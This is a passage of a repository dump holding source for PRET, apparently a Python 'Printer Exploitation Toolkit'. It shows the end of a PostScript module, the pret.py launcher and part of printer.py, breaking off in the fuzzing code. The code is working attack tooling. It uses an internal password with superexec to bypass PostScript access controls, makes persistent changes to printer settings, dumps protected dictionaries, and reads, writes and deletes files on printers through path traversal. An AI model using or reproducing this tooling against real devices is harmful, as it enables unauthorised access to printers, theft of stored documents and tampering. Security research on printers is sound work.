TBD: experimental privilege escalation\n        if not dict:  # dump whole dictstack if optional dict parameter is empty\n            # dict = 'superdict'\n            # self.chitchat(\"No dictionary given - dumping everything (might take some time)\")\n            return self.onecmd(\"help dump\")\n        # recursively dump contents of a postscript dictionary and convert them to json\n        str_send = '/superdict {<< /universe countdictstack array dictstack >>} def\\n'  \\\n                   '/strcat {exch dup length 2 index length add string dup\\n'           \\\n                   'dup 4 2 roll copy length 4 -1 roll putinterval} def\\n'              \\\n                   '/remove {exch pop () exch 3 1 roll exch strcat strcat} def\\n'       \\\n                   '/escape { {(\")   search {remove}{exit} ifelse} loop \\n'             \\\n                   '          {(/)   search {remove}{exit} ifelse} loop \\n'             \\\n                   '          {(\\\\\\) search {remove}{exit} ifelse} loop } def\\n'        \\\n                   '/clones 220 array def /counter 0 def % performance drawback\\n'      \\\n                   '/redundancy { /redundant false def\\n'                               \\\n                   '  clones {exch dup 3 1 roll eq {/redundant true def} if} forall\\n'  \\\n                   '  redundant not {\\n'                                                \\\n                   '  dup clones counter 3 2 roll put  % put item into clonedict\\n'     \\\n                   '  /counter counter 1 add def       % auto-increment counter\\n'      \\\n                   '  } if redundant} def              % return true or false\\n'        \\\n                   '/wd {redundancy {pop q (<redundant dict>) p q bc s}\\n'              \\\n                   '{bo n {t exch q 128 a q c dump n} forall bc bc s} ifelse } def\\n'   \\\n                   '/wa {q q bc s} def\\n'                                               \\\n                   '% /wa {ao n {t dump n} forall ac bc s} def\\n'                       \\\n                   '/n  {(\\\\n) print} def               % newline\\n'                    \\\n                   '/t  {(\\\\t) print} def               % tabulator\\n'                  \\\n                   '/bo {({)   print} def              % bracket open\\n'                \\\n                   '/bc {(})   print} def              % bracket close\\n'               \\\n                   '/ao {([)   print} def              % array open\\n'                  \\\n                   '/ac {(])   print} def              % array close\\n'                 \\\n                   '/q  {(\")   print} def              % quote\\n'                       \\\n                   '/s  {(,)   print} def              % comma\\n'                       \\\n                   '/c  {(: )  print} def              % colon\\n'                       \\\n                   '/p  {                  print} def  % print string\\n'                \\\n                   '/a  {string cvs        print} def  % print any\\n'                   \\\n                   '/pe {escape            print} def  % print escaped string\\n'        \\\n                   '/ae {string cvs escape print} def  % print escaped any\\n'           \\\n                   '/perms { readable  {(r) p}{(-) p} ifelse\\n'                         \\\n                   '         writeable {(w) p}{(-) p} ifelse } def\\n'                   \\\n                   '/rwcheck { % readable/writeable check\\n'                            \\\n                   '  dup rcheck not {/readable  false def} if\\n'                       \\\n                   '  dup wcheck not {/writeable false def} if perms } def\\n'           \\\n                   '/dump {\\n'                                                          \\\n                   '  /readable true def /writeable true def\\n'                         \\\n                   '  dup type bo (\"type\": ) p q 16 a q s\\n'                            \\\n                   '  %%%% check permissions %%%\\n'                                     \\\n                   '  ( \"perms\": ) p q\\n'                                               \\\n                   '  dup type /stringtype eq {rwcheck} {\\n'                            \\\n                   '    dup type /dicttype eq {rwcheck} {\\n'                            \\\n                   '      dup type /arraytype eq {rwcheck} {\\n'                         \\\n                   '        dup type /packedarraytype eq {rwcheck} {\\n'                 \\\n                   '          dup type /filetype eq {rwcheck} {\\n'                      \\\n                   '            perms } % inherit perms from parent\\n'                  \\\n                   '          ifelse} ifelse} ifelse} ifelse} ifelse\\n'                 \\\n                   '  dup xcheck {(x) p}{(-) p} ifelse\\n'                               \\\n                   '  %%%% convert values to strings %%%\\n'                             \\\n                   '  q s ( \"value\": ) p\\n'                                             \\\n                   '  %%%% on invalidaccess %%%\\n'                                      \\\n                   '  readable false eq {pop q (<access denied>) p q bc s}{\\n'          \\\n                   '  dup type /integertype     eq {q  12        a q bc s}{\\n'          \\\n                   '  dup type /operatortype    eq {q 128       ae q bc s}{\\n'          \\\n                   '  dup type /stringtype      eq {q           pe q bc s}{\\n'          \\\n                   '  dup type /booleantype     eq {q   5        a q bc s}{\\n'          \\\n                   '  dup type /dicttype        eq {            wd       }{\\n'          \\\n                   '  dup type /arraytype       eq {            wa       }{\\n'          \\\n                   '  dup type /packedarraytype eq {            wa       }{\\n'          \\\n                   '  dup type /nametype        eq {q 128       ae q bc s}{\\n'          \\\n                   '  dup type /fonttype        eq {q  30       ae q bc s}{\\n'          \\\n                   '  dup type /nulltype        eq {q pop (null) p q bc s}{\\n'          \\\n                   '  dup type /realtype        eq {q  42        a q bc s}{\\n'          \\\n                   '  dup type /filetype        eq {q 100       ae q bc s}{\\n'          \\\n                   '  dup type /marktype        eq {q 128       ae q bc s}{\\n'          \\\n                   '  dup type /savetype        eq {q 128       ae q bc s}{\\n'          \\\n                   '  dup type /gstatetype      eq {q 128       ae q bc s}{\\n'          \\\n                   '  (<cannot handle>) p}\\n'                                           \\\n                   '  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\\n'\\\n                   '  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\\n'\\\n                   'def\\n'\n        if not resource:\n            str_send += '(' + dict + ') where {'\n        str_send += 'bo 1183615869 ' + dict + \\\n            ' {exch q 128 a q c dump n} forall bc'\n        if not resource:\n            str_send += '}{(<nonexistent>) print} ifelse'\n        str_recv = self.clean_json(self.cmd(str_send))\n        if str_recv == '<nonexistent>':\n            output().info(\"Dictionary not found\")\n        else:  # convert ps dictionary to json\n            return json.loads(str_recv, object_pairs_hook=collections.OrderedDict, strict=False)\n\n    # bad practice\n    def clean_json(self, string):\n        string = re.sub(\",[ \\t\\r\\n]+}\", \"}\", string)\n        string = re.sub(\",[ \\t\\r\\n]+\\]\", \"]\", string)\n        return string\n        # return str(string, errors='ignore')\n\n    # ------------------------[ resource <category> [dump] ]--------------\n    def do_resource(self, arg):\n        arg = re.split(\"\\s+\", arg, 1)\n        cat, dump = arg[0], len(arg) > 1\n        self.populate_resource()\n        if cat in self.options_resource:\n            str_send = '(*) {128 string cvs print (\\\\n) print}'\\\n                       ' 128 string /' + cat + ' resourceforall'\n            items = self.cmd(str_send).splitlines()\n            for item in sorted(items):\n                output().info(item)\n                if dump:\n                    self.do_dump('/' + item + ' /' + cat +\n                                 ' findresource', True)\n        else:\n            self.onecmd(\"help resource\")\n\n    def help_resource(self):\n        self.populate_resource()\n        print(\"List or dump PostScript resource:  resource <category> [dump]\")\n        print(\"Available resources on this device:\")\n        if len(self.options_resource) > 0:\n            last = sorted(self.options_resource)[-1]\n        for res in sorted(self.options_resource):\n            print((('└─ ' if res == last else '├─ ') + res))\n\n    options_resource = []\n\n    def complete_resource(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_resource if cat.startswith(text)]\n\n    # retrieve available resources\n    def populate_resource(self):\n        if not self.options_resource:\n            str_send = '(*) {print (\\\\n) print} 128 string /Category resourceforall'\n            self.options_resource = self.cmd(str_send).splitlines()\n\n    # ------------------------[ set <key=value> ]-------------------------\n    def do_set(self, arg):\n        \"Set key to value in topmost dictionary:  set <key=value>\"\n        arg = re.split(\"=\", arg, 1)\n        if len(arg) > 1:\n            key, val = arg\n            # make changes permanent\n            str_send = 'true 0 startjob {\\n'\n            # flavor No.1: put (associate key with value in dict)\n            str_send += '/' + key + \\\n                ' where {/' + key + ' ' + val + ' put} if\\n'\n            # flavor No.2: store (replace topmost definition of key)\n            str_send += '/' + key + ' ' + val + ' store\\n'\n            # flavor No.3: def (associate key and value in userdict)\n            str_send += '/' + key + ' ' + val + ' def\\n'\n            # ignore invalid access\n            str_send += '} 1183615869 internaldict /superexec get exec'\n            self.cmd(str_send, False)\n        else:\n            self.onecmd(\"help set\")\n\n    # ------------------------[ config <setting> ]------------------------\n    def do_config(self, arg):\n        arg = re.split(\"\\s+\", arg, 1)\n        (arg, val) = tuple(arg) if len(arg) > 1 else (arg[0], None)\n        if arg in list(self.options_config.keys()):\n            key = self.options_config[arg]\n            if arg == 'copies' and not val:\n                return self.help_config()\n            output().psonly()\n            val = val or 'currentpagedevice /' + key + ' get not'\n            output().info(self.globalcmd(\n                'currentpagedevice /' + key + ' known\\n'\n                '{<< /' + key + ' ' + val + ' >> setpagedevice\\n'\n                '(' + key + ' ) print currentpagedevice /' + key + ' get\\n'\n                'dup type /integertype eq {(= ) print 8 string cvs print}\\n'\n                '{{(enabled)}{(disabled)} ifelse print} ifelse}\\n'\n                '{(Not available) print} ifelse'))\n        else:\n            self.help_config()\n\n    def help_config(self):\n        print(\"Change printer settings:  config <setting>\")\n        print(\"  duplex      - Set duplex printing.\")\n        print(\"  copies #    - Set number of copies.\")\n        print(\"  economode   - Set economic mode.\")\n        print(\"  negative    - Set negative print.\")\n        print(\"  mirror      - Set mirror inversion.\")\n\n    options_config = {'duplex': 'Duplex',\n                      'copies': 'NumCopies',\n                      'economode': 'EconoMode',\n                      'negative': 'NegativePrint',\n                      'mirror': 'MirrorPrint'}\n\n    def complete_config(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_config if cat.startswith(text)]\n"
        },
        {
          "name": "pret.py",
          "type": "blob",
          "size": 3.271484375,
          "content": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom __future__ import print_function\n\n# python standard library\nimport os\nimport sys\nimport argparse\n\n# local pret classes\nfrom discovery import discovery\nfrom capabilities import capabilities\nfrom postscript import postscript\nfrom pjl import pjl\nfrom pcl import pcl\n\n# ----------------------------------------------------------------------\n\n\ndef usage():\n    parser = argparse.ArgumentParser(\n        description=\"Printer Exploitation Toolkit.\")\n    parser.add_argument(\"target\", help=\"printer device or hostname\")\n    parser.add_argument(\n        \"mode\", choices=['ps', 'pjl', 'pcl'], help=\"printing language to abuse\")\n    parser.add_argument(\n        \"-s\", \"--safe\", help=\"verify if language is supported\", action=\"store_true\")\n    parser.add_argument(\n        \"-q\", \"--quiet\", help=\"suppress warnings and chit-chat\", action=\"store_true\")\n    parser.add_argument(\n        \"-d\", \"--debug\", help=\"enter debug mode (show traffic)\", action=\"store_true\")\n    parser.add_argument(\"-i\", \"--load\", metavar=\"file\",\n                        help=\"load and run commands from file\")\n    parser.add_argument(\"-o\", \"--log\", metavar=\"file\",\n                        help=\"log raw data sent to the target\")\n    if len(sys.argv) < 2:\n        discovery(True)  # list local printers if no arguments given at all\n    if len(sys.argv) == 2:\n        print(\"No printer language given, please select one\" + os.linesep)\n    return parser.parse_args()\n\n# ----------------------------------------------------------------------\n\n\ndef intro(quiet):\n    if not quiet:\n        print(\"      ________________                                             \")\n        print(\"    _/_______________/|                                            \")\n        print(\"   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40\")\n        print(\"  |===        |----| ||    by Jens Mueller <jens.a.mueller@rub.de> \")\n        print(\"  |           |   ô| ||                                            \")\n        print(\"  |___________|   ô| ||                                            \")\n        print(\"  | ||/.´---.||    | ||      「 pentesting tool that made          \")\n        print(\"  |-||/_____\\||-.  | |´         dumpster diving obsolete‥ 」       \")\n        print(\"  |_||=L==H==||_|__|/                                              \")\n        print(\"                                                                   \")\n        print(\"     (ASCII art by                                                 \")\n        print(\"     Jan Foerster)                                                 \")\n        print(\"                                                                   \")\n\n# ----------------------------------------------------------------------\n\n\ndef main():\n    args = usage()     # parse args/options #\n    intro(args.quiet)  # show asciitainment #\n    capabilities(args)  # check capabilities #\n    # connect to printer, use this language #\n    if args.mode == 'ps':\n        postscript(args)\n    if args.mode == 'pjl':\n        pjl(args)\n    if args.mode == 'pcl':\n        pcl(args)\n\n# ----------------------------------------------------------------------\n\n\n# clean exit\nif __name__ == '__main__':\n    try:\n        main()\n    # catch CTRL-C\n    except (KeyboardInterrupt):\n        pass\n    finally:\n        print(\"\")\n"
        },
        {
          "name": "printer.py",
          "type": "blob",
          "size": 31.8642578125,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport re\nimport os\nimport sys\nimport cmd\nimport glob\nimport errno\nimport random\nimport ntpath\nimport posixpath\nimport hashlib\nimport tempfile\nimport subprocess\nimport traceback\n\n# local pret classes\nfrom helper import log, output, conv, file, item, conn, const as c\nfrom discovery import discovery\nfrom fuzzer import fuzzer\n\n\nclass printer(cmd.Cmd, object):\n    # cmd module config and customization\n    intro = \"Welcome to the pret shell. Type help or ? to list commands.\"\n    doc_header = \"Available commands (type help <topic>):\"\n    offline_str = \"Not connected.\"\n    undoc_header = None\n    # do not change\n    logfile = None\n    debug = False\n    status = False\n    quiet = False\n    fuzz = False\n    conn = None\n    mode = None\n    error = None\n    iohack = True\n    timeout = 10\n    target = \"\"\n    vol = \"\"\n    cwd = \"\"\n    traversal = \"\"\n    # can be changed\n    editor = \"vim\"  # set to nano/edit/notepad/leafpad/whatever\n\n    # --------------------------------------------------------------------\n    def __init__(self, args):\n        # init cmd module\n        cmd.Cmd.__init__(self)\n        self.debug = args.debug  # debug mode\n        self.quiet = args.quiet  # quiet mode\n        self.mode = args.mode  # command mode\n        # connect to device\n        self.do_open(args.target, \"init\")\n        # log pjl/ps cmds to file\n        if args.log:\n            self.logfile = log().open(args.log)\n            header = None\n            if self.mode == \"ps\":\n                header = c.PS_HEADER\n            if self.mode == \"pcl\":\n                header = c.PCL_HEADER\n            if header:\n                log().write(self.logfile, header + os.linesep)\n        # run pret cmds from file\n        if args.load:\n            self.do_load(args.load)\n        # input loop\n        self.cmdloop()\n\n    def set_defaults(self, newtarget):\n        self.fuzz = False\n        if newtarget:\n            self.set_vol()\n            self.set_traversal()\n            self.error = None\n        else:\n            self.set_prompt()\n\n    # --------------------------------------------------------------------\n    # do noting on empty input\n    def emptyline(self):\n        pass\n\n    # show message for unknown commands\n    def default(self, line):\n        if line and line[0] != \"#\":  # interpret as comment\n            output().chitchat(\"Unknown command: '\" + line + \"'\")\n\n    # suppress help message for undocumented commands\n    def print_topics(self, header, cmds, cmdlen, maxcol):\n        if header is not None:\n            cmd.Cmd.print_topics(self, header, cmds, cmdlen, maxcol)\n\n    # suppress some chit-chat in quiet mode\n    def chitchat(self, *args):\n        if not self.quiet:\n            output().chitchat(*args)\n\n    # --------------------------------------------------------------------\n    # code to be executed before command line is interpreted\n    def precmd(self, line):\n        # commands that can be run offline\n        off_cmd = [\n            \"#\",\n            \"?\",\n            \"help\",\n            \"exit\",\n            \"quit\",\n            \"EOF\",\n            \"timeout\",\n            \"mode\",\n            \"load\",\n            \"loop\",\n            \"discover\",\n            \"open\",\n            \"debug\",\n        ]\n        # remove whitepaces\n        line = line.strip()\n        if line and line.split()[0] not in off_cmd:\n            # write non-empty lines to logfile\n            log().comment(self.logfile, line)\n            # only let \"offline\" functions pass if not connected\n            if self.conn == None:\n                print((self.offline_str))\n                return os.linesep\n        # finally return original command\n        return line\n\n    # --------------------------------------------------------------------\n    # catch-all wrapper to guarantee continuation on unhandled exceptions\n    def onecmd(self, line):\n        try:\n            cmd.Cmd.onecmd(self, line)\n        except Exception as e:\n            print(traceback.print_exc())\n            output().errmsg(\"Program Error\", e)\n\n    # ====================================================================\n\n    # ------------------------[ exit ]------------------------------------\n    def do_exit(self, *arg):\n        # close logfile\n        if self.logfile:\n            log().close(self.logfile)\n        sys.exit()\n\n    # define alias but do not show alias in help\n    do_quit = do_exit\n    do_EOF = do_exit\n\n    def help_exit(self):\n        print(\"Exit the interpreter.\")\n\n    # ------------------------[ debug ]-----------------------------------\n    def do_debug(self, arg):\n        \"Enter debug mode. Use 'hex' for hexdump:  debug [hex]\"\n        self.debug = not self.debug\n        # set hex mode (= ascii + hexdump)\n        if arg == \"hex\":\n            self.debug = \"hex\"\n        if self.conn:\n            self.conn.debug = self.debug\n        print((\"Debug mode on\" if self.debug else \"Debug mode off\"))\n\n    # ====================================================================\n\n    # ------------------------[ load ]------------------------------------\n    def do_load(self, arg):\n        \"Run commands from file:  load cmd.txt\"\n        if not arg:\n            arg = eval(input(\"File: \"))\n        data = file().read(arg).decode() or \"\"\n        for cmd in data.splitlines():\n            # simulate command prompt\n            print((self.prompt + cmd))\n            # execute command with premcd\n            self.onecmd(self.precmd(cmd))\n\n    # ------------------------[ loop <cmd> <arg1> <arg2> … ]--------------\n    def do_loop(self, arg):\n        \"Run command for multiple arguments:  loop <cmd> <arg1> <arg2> …\"\n        args = re.split(\"\\s+\", arg)\n        if len(args) > 1:\n            cmd = args.pop(0)\n            for arg in args:\n                output().chitchat(\"Executing command: '\" + cmd + \" \" + arg + \"'\")\n                self.onecmd(cmd + \" \" + arg)\n        else:\n            self.onecmd(\"help loop\")\n\n    # ====================================================================\n\n    # ------------------------[ discover ]--------------------------------\n    def do_discover(self, arg):\n        \"Discover local printer devices via SNMP.\"\n        discovery()\n\n    # ------------------------[ open <target> ]---------------------------\n    def do_open(self, arg, mode=\"\"):\n        \"Connect to remote device:  open <target>\"\n        if not arg:\n            arg = eval(input(\"Target: \"))\n        # open connection\n        try:\n            newtarget = arg != self.target\n            self.target = arg  # set new target\n            self.conn = conn(self.mode, self.debug, self.quiet)\n            self.conn.timeout(self.timeout)\n            self.conn.open(arg)\n            print((\"Connection to \" + arg + \" established\"))\n            # hook method executed after successful connection\n            self.on_connect(mode)\n            # show some information about the device\n            if not self.quiet and mode != \"reconnect\":\n                sys.stdout.write(\"Device:   \")\n                self.do_id()\n            print(\"\")\n            # set printer default values\n            self.set_defaults(newtarget)\n        except Exception as e:\n            output().errmsg(\"Connection to \" + arg + \" failed\", e)\n            self.do_close()\n            # exit if run from init function (command line)\n            if mode == \"init\":\n                self.do_exit()\n\n    # wrapper to send data\n    def send(self, data):\n        if self.conn:\n            self.conn.send(data)\n\n    # wrapper to recv data\n    def recv(self, *args):\n        return self.conn.recv_until(*args) if self.conn else \"\"\n\n    # ------------------------[ close ]-----------------------------------\n    def do_close(self, *arg):\n        \"Disconnect from device.\"\n        if self.conn:\n            self.conn.close()\n            self.conn = None\n        print(\"Connection closed.\")\n        self.set_prompt()\n\n    # ------------------------[ timeout <seconds> ]-----------------------\n    def do_timeout(self, arg, quiet=False):\n        \"Set connection timeout:  timeout <seconds>\"\n        try:\n            if arg:\n                if self.conn:\n                    self.conn.timeout(float(arg))\n                self.timeout = float(arg)\n            if not quiet:\n                print((\"Device or socket timeout: \" + str(self.timeout)))\n        except Exception as e:\n            output().errmsg(\"Cannot set timeout\", e)\n\n    # send mode-specific command with modified timeout\n    def timeoutcmd(self, str_send, timeout, *stuff):\n        timeout_old = self.timeout\n        self.do_timeout(timeout, True)\n        str_recv = self.cmd(str_send, *stuff)\n        self.do_timeout(timeout_old, True)\n        return str_recv\n\n    # ------------------------[ reconnect ]-------------------------------\n    def do_reconnect(self, *arg):\n        self.do_close()\n        self.do_open(self.target, \"reconnect\")\n\n    # re-open connection\n    def reconnect(self, msg):\n        # on incomplete command show error message\n        if msg:\n            output().errmsg(\"Command execution failed\", msg)\n        sys.stdout.write(os.linesep + \"Forcing reconnect. \")\n        # workaround to flush socket buffers\n        self.do_close()\n        self.do_open(self.target, \"reconnect\")\n        # on CTRL+C spawn a new shell\n        if not msg:\n            self.cmdloop(intro=\"\")\n\n    # --------------------------------------------------------------------\n    # dummy functions to overwrite\n    def on_connect(self, mode):\n        pass\n\n    def do_id(self, *arg):\n        output().info(\"Unknown printer\")\n\n    # ====================================================================\n\n    # ------------------------[ pwd ]-------------------------------------\n    def do_pwd(self, arg):\n        \"Show working directory on remote device.\"\n        path = (\"\" if self.vol else c.SEP) + self.rpath()\n        output().raw(path)\n\n    # ------------------------[ chvol <volume> ]--------------------------\n    def do_chvol(self, arg):\n        \"Change remote volume:  chvol <volume>\"\n        if not arg:\n            arg = eval(input(\"Volume: \"))\n        if arg and self.vol_exists(arg):\n            if self.mode == \"ps\":\n                self.set_vol(\"%\" + arg.strip(\"%\") + \"%\")\n            if self.mode == \"pjl\":\n                self.set_vol(arg[0] + \":\" + c.SEP)\n            print((\"Volume changed to \" + self.vol))\n        else:\n            print(\"Volume not available\")\n\n    # set volume\n    def set_vol(self, vol=\"\"):\n        if not vol:\n            # set default volumes\n            if self.mode == \"ps\":\n                vol = c.PS_VOL\n            if self.mode == \"pjl\":\n                vol = c.PJL_VOL\n        if self.vol != vol:\n            # reset path traversal and cwd\n            self.set_traversal()\n            # set actual volume\n            self.vol = vol\n\n    # get volume\n    def get_vol(self):\n        vol = self.vol\n        if vol and self.mode == \"ps\":\n            vol = vol.strip(\"%\")\n        if vol and self.mode == \"pjl\":\n            vol = vol[0]\n        return vol\n\n    # ------------------------[ traversal <path> ]------------------------\n    def do_traversal(self, arg):\n        \"Set path traversal:  traversal <path>\"\n        if not arg or self.dir_exists(self.tpath(arg)):\n            self.set_traversal(arg)\n            print((\"Path traversal \" + (\"\" if arg else \"un\") + \"set.\"))\n        else:\n            print(\"Cannot use this path traversal.\")\n\n    # set path traversal\n    def set_traversal(self, traversal=\"\"):\n        self.traversal = traversal\n        if not traversal:\n            self.set_cwd()\n\n    # ------------------------[ cd <path> ]-------------------------------\n    def do_cd(self, arg):\n        \"Change remote working directory:  cd <path>\"\n        if not self.cpath(arg) or self.dir_exists(self.rpath(arg)):\n            if re.match(\"^[\\.\" + c.SEP + \"]+$\", self.cpath(arg)):\n                output().raw(\"*** Congratulations, path traversal found ***\")\n                output().chitchat(\"Consider setting 'traversal' instead of 'cd'.\")\n            self.set_cwd(arg)\n        else:\n            print(\"Failed to change directory.\")\n\n    # set current working directory\n    def set_cwd(self, cwd=\"\"):\n        self.cwd = self.cpath(cwd) if cwd else \"\"\n        self.set_prompt()\n\n    # set command prompt\n    def set_prompt(self):\n        target = self.target + \":\" if self.conn else \"\"\n        cwd = self.cwd if self.conn else \"\"\n        self.prompt = target + c.SEP + cwd + \"> \"\n\n    # get separator\n    def get_sep(self, path):\n        # don't add separator between ps volume and filename\n        if self.mode == \"ps\" and re.search(\"^%.*%$\", path):\n            return \"\"\n        # add separator if we have to deal with a directory\n        return c.SEP if (path or self.cwd or self.traversal) else \"\"\n\n    # --------------------------------------------------------------------\n    # get path without traversal and cwd information\n    def tpath(self, path):\n        # remove leading separators\n        path = path.lstrip(c.SEP)\n        return self.vol + self.normpath(path)\n\n    # get path without volume and traversal information\n    def cpath(self, path):\n        # generate virtual path on remote device\n        path = c.SEP.join((self.cwd, path))\n        # remove leading separators\n        path = path.lstrip(c.SEP)\n        return self.normpath(path)\n\n    # get path without volume information\n    def vpath(self, path):\n        # generate virtual path on remote device\n        path = c.SEP.join((self.traversal, self.cwd, path))\n        # remove leading separators\n        path = path.lstrip(c.SEP)\n        return self.normpath(path)\n\n    # get path with volume information\n    def rpath(self, path=\"\"):\n        # warn if path contains volume information\n        if (path.startswith(\"%\") or path.startswith(\"0:\")) and not self.fuzz:\n            output().warning(\"Do not refer to disks directly, use chvol.\")\n        # in fuzzing mode leave remote path as it is\n        if self.fuzz:\n            return path\n        # prepend volume information to virtual path\n        return self.vol + self.vpath(path)\n\n    # get normalized pathname\n    def normpath(self, path):\n        path = posixpath.normpath(path)\n        \"\"\"\n    ┌───────────────────────────────────────────────────────┐\n    │        problems when using posixpath.normpath         │\n    ├───────────────────────────────────────────────────────┤\n    │ [✗] breaks obscure traversal strategies like '.../..' │\n    │ [✓] removes tailing separators, we can deal with this │\n    │ [✓] sets '.' for 'dir/..', refused by ps interpreters │\n    └───────────────────────────────────────────────────────┘\n    \"\"\"\n        # path = re.sub(r\"(/)\", \"\\\\\\\\\", path)      ### Epson/Samsung PJL\n        # path = re.sub(r\"(/\\.\\.)\", \"/../.\", path) ### HP path traversal\n        return path if path != \".\" else \"\"\n\n    # --------------------------------------------------------------------\n    # get filename, independent of path naming convention\n    def basename(self, path):\n        path = os.path.basename(posixpath.basename(ntpath.basename(path)))\n        return path\n\n    # ====================================================================\n\n    # ------------------------[ get <file> ]------------------------------\n    def do_get(self, arg, lpath=\"\", r=True):\n        \"Receive file:  get <file>\"\n        if not arg:\n            arg = eval(input(\"Remote file: \"))\n        if not lpath:\n            lpath = self.basename(arg)\n        path = self.rpath(arg) if r else arg\n        str_recv = self.get(path)\n        if str_recv != c.NONEXISTENT:\n            rsize, data = str_recv\n            lsize = len(data)\n            # fix carriage return chars added by some devices\n            if lsize != rsize and len(conv().nstrip(data)) == rsize:\n                lsize, data = rsize, conv().nstrip(data)\n            # write to local file\n            file().write(lpath, data.encode())\n            if lsize == rsize:\n                print((str(lsize) + \" bytes received.\"))\n            else:\n                self.size_mismatch(rsize, lsize)\n\n    def size_mismatch(self, size1, size2):\n        size1, size2 = str(size1), str(size2)\n        print((\"Size mismatch (should: \" + size1 + \", is: \" + size2 + \").\"))\n\n    # ------------------------[ put <local file> ]------------------------\n    def do_put(self, arg, rpath=\"\"):\n        \"Send file:  put <local file>\"\n        if not arg:\n            arg = eval(input(\"Local file: \"))\n        if not rpath:\n            rpath = os.path.basename(arg)\n        rpath = self.rpath(rpath)\n        lpath = os.path.abspath(arg)\n        # read from local file\n        data = file().read(lpath)\n        if data != None:\n            self.put(rpath, data)\n            lsize = len(data)\n            rsize = self.file_exists(rpath)\n            if rsize == lsize:\n                print((str(rsize) + \" bytes transferred.\"))\n            elif rsize == c.NONEXISTENT:\n                print(\"Permission denied.\")\n            else:\n                self.size_mismatch(lsize, rsize)\n\n    # ------------------------[ append <file> <string> ]------------------\n    def do_append(self, arg):\n        \"Append to file:  append <file> <string>\"\n        arg = re.split(\"\\s+\", arg, 1)\n        if len(arg) > 1:\n            path, data = arg\n            rpath = self.rpath(path)\n            data = data + os.linesep\n            self.append(rpath, data)\n        else:\n            self.onecmd(\"help append\")\n\n    # ------------------------[ touch <file> ]----------------------------\n    def do_touch(self, arg):\n        \"Update file timestamps:  touch <file>\"\n        if not arg:\n            arg = eval(input(\"Remote file: \"))\n        rpath = self.rpath(arg)\n        self.append(rpath, \"\")\n\n    # ------------------------[ delete <file> ]---------------------------\n    def do_delete(self, arg):\n        if not arg:\n            arg = eval(input(\"File: \"))\n        self.delete(arg)\n\n    # define alias but do not show alias in help\n    do_rm = do_delete\n    do_rmdir = do_delete\n\n    def help_delete(self):\n        print(\"Delete remote file:  delete <file>\")\n\n    # ------------------------[ cat <file> ]------------------------------\n    def do_cat(self, arg):\n        \"Output remote file to stdout:  cat <file>\"\n        if not arg:\n            arg = eval(input(\"Remote file: \"))\n        path = self.rpath(arg)\n        str_recv = self.get(path)\n        if str_recv != c.NONEXISTENT:\n            rsize, data = str_recv\n            output().raw(data.strip())\n\n    # ------------------------[ edit <file> ]-----------------------------\n    def do_edit(self, arg):\n        # get name of temporary file\n        t = tempfile.NamedTemporaryFile(delete=False)\n        lpath = t.name\n        t.close\n        # download to temporary file\n        self.do_get(arg, lpath)\n        # get md5sum for original file\n        chksum1 = hashlib.md5(open(lpath, \"rb\").read()).hexdigest()\n        try:\n            subprocess.call([self.editor, lpath])\n            # get md5sum for edited file\n            chksum2 = hashlib.md5(open(lpath, \"rb\").read()).hexdigest()\n            # upload file, if changed\n            if chksum1 == chksum2:\n                print(\"File not changed.\")\n            else:\n                self.do_put(lpath, arg)\n        except Exception as e:\n            output().errmsg(\"Cannot edit file - Set self.editor\", e)\n        # delete temporary file\n        os.remove(lpath)\n\n    # define alias but do not show alias in help\n    do_vim = do_edit\n\n    def help_edit(self):\n        print(\"Edit remote files with our favorite editor:  edit <file>\")\n\n    # ------------------------[ mirror <path> ]---------------------------\n    def mirror(self, name, size):\n        target, vol = self.basename(self.target), self.get_vol()\n        root = os.path.abspath(os.path.join(\"mirror\", target, vol))\n        lpath = os.path.join(root, name)\n        \"\"\"\n    ┌───────────────────────────────────────────────────────────┐\n    │                 mitigating path traversal                 │\n    ├───────────────────────────────────────────────────────────┤\n    │ creating a mirror can be a potential security risk if the │\n    │ path contains traversal characters, environment variables │\n    │ or other things we have not thought about; while the user │\n    │ is in total control of the path (via 'cd' and 'traversal' │\n    │ commands), she might accidentally overwrite her files...  │\n    │                                                           │\n    │ our strategy is to first replace trivial path traversal   │\n    │ strings (while still being able to download the files)    │\n    │ and simply give up on more sophisticated ones for now.    │\n    └───────────────────────────────────────────────────────────┘\n    \"\"\"\n        # replace path traversal (poor man's version)\n        lpath = re.sub(r\"(\\.)+\" + c.SEP, \"\", lpath)\n        # abort if we are still out of the mirror root\n        if not os.path.realpath(lpath).startswith(root):\n            output().errmsg(\n                \"Not saving data out of allowed path\",\n                \"I'm sorry Dave, I'm afraid I can't do that.\",\n            )\n        elif size:  # download current file\n            output().raw(self.vol + name + \" -> \" + lpath)\n            self.makedirs(os.path.dirname(lpath))\n            self.do_get(self.vol + name, lpath, False)\n        else:  # create current directory\n            self.chitchat(\"Traversing \" + name)\n            self.makedirs(lpath)\n\n    # recursive directory creation\n    def makedirs(self, path):\n        try:\n            os.makedirs(path)\n        except OSError as e:\n            if e.errno == errno.EEXIST and os.path.isdir(path):\n                pass\n            else:\n                raise\n\n    # --------------------------------------------------------------------\n    # auto-complete dirlist for local fs\n    def complete_lfiles(self, text, line, begidx, endidx):\n        before_arg = line.rfind(\" \", 0, begidx)\n        if before_arg == -1:\n            return  # arg not found\n\n        fixed = line[before_arg + 1: begidx]  # fixed portion of the arg\n        arg = line[before_arg + 1: endidx]\n        pattern = arg + \"*\"\n\n        completions = []\n        for path in glob.glob(pattern):\n            if path and os.path.isdir(path) and path[-1] != os.sep:\n                path = path + os.sep\n            completions.append(path.replace(fixed, \"\", 1))\n        return completions\n\n    # define alias\n    complete_load = complete_lfiles  # files or directories\n    complete_put = complete_lfiles  # files or directories\n    complete_print = complete_lfiles  # files or directories\n\n    # ====================================================================\n\n    # ------------------------[ fuzz <category> ]-------------------------\n    def do_fuzz(self, arg):\n        if arg in self.options_fuzz:\n            # enable global fuzzing\n            self.fuzz = True\n            if arg == \"path\":\n                self.fuzz_path()\n            if arg == \"write\":\n                self.fuzz_write()\n            if arg == \"blind\":\n                self.fuzz_blind()\n            self.chitchat(\"Fuzzing finished.\")\n            # disable global fuzzing\n            self.fuzz = False\n        else:\n            self.help_fuzz()\n\n    def fuzz_path(self):\n        